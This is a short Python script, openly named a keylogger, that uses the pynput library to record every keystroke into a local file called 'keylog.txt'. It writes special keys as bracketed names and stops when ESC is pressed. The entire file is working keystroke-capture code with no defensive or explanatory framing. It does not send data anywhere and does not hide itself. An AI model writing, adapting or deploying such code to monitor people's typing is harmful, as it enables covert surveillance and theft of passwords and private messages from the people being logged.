from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    """Callback function when a key is pressed."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    """Callback function when a key is released."""
    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Starts the keylogger."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting keylogger... Press ESC to stop.")
    start_keylogger()
